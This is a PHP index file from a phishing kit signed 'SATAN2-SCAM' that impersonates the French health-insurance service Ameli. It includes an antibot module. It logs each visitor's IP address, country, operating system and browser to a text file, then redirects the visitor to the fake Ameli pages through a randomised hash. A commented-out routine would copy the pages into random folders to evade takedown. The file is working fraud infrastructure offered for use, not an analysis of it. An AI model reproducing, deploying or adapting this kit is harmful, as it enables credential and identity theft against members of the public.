<?php

/**
 * @link     : https://www.lesatan2scam.com/ 
 * @package  : AMELI-ASSURANCE
 * @author   : SATAN2-SCAM 
 * @telegram : @lesatan2scam
 * @couriel  : lesatan2scam@gmail.com
 * @version  : Mise à jour
 * @copyright: https://facebook.com/lesatan2scam
 */

include 'main/antibots.php';
include 'main/main.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$AML = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="pages";
/*recurse_copy( $home, $DIR );*/
header("location:pages/index.php?aml#".$AML."");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    